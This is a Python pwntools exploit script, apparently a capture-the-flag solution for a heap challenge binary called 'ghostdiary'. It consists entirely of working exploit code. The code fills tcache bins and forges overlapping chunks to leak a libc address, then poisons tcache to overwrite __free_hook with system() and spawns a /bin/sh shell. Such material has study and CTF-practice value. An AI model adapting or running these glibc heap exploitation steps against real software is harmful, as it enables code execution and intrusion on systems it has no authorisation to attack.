from pwn import *

p = process("./ghostdiary")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

def add(size):
  p.sendlineafter('> ', '1')

  if size <= 0xf0:
    p.sendlineafter('> ', '1')
  else:
    p.sendlineafter('> ', '2')

  p.sendlineafter(': ', str(size))

def talk(page, content):
  p.sendlineafter('> ', '2')
  p.sendlineafter(': ', str(page))
  p.sendafter(': ', str(content))

def listen(page):
  p.sendlineafter('> ', '3')
  p.sendlineafter(': ', str(page))
  content = p.recvline().split(': ')[1].strip('\n')
  return content

def free(page):
  p.sendlineafter('> ', '4')
  p.sendlineafter(': ', str(page)) 

def exploit():
    add(0x128)
    add(0x118)
    add(0x118)

    #preparing for tcache bins
    for i in range(7):
        add(0xf0)
    for i in range(7):
        free(i + 3)

    for i in range(7):
        add(0x128)
    for i in range(7):
        free(i + 3)

    free(0)

    talk(1, 'A' * 0x110 + p64(0x250)) # fake chunk 0x250 karena 0x130 + 0x120 = 0x250, chunk A dan chunk B digabungkan
    talk(2, 'B' * 0xf8 + p64(0x21)+'\n')

    free(2)

    for i in range(7):
        add(0x128)

    add(0x128)

    libc_leak = u64(listen(1).ljust(8, '\x00'))
    libc.address = libc_leak - 0x3ebca0
    one_gadget = libc.address + 0x4f322
    free_hook = libc.symbols['__free_hook']
    libc_system = libc.symbols['system']

    log.info('main arena leak: ' + hex(libc_leak))
    log.info('Libc base: ' + hex(libc.address))
    log.info('one gadget: ' + hex(one_gadget))
    log.info('free_hook: ' + hex(free_hook))

    free(0)

    for i in range(2, 8):
      free(i)
    
    add(0x1d8)
    
    free(0)
    free(1)

    add(0x1d8)
    talk(0, p64(free_hook) + '\n')
    add(0x1d8)
    add(0x1d8)
    talk(1, '/bin/sh\x00\n')
    talk(2, p64(libc_system) + '\n')

    free(1)
    gdb.attach(p)

    p.interactive()

if __name__ == "__main__":
    exploit()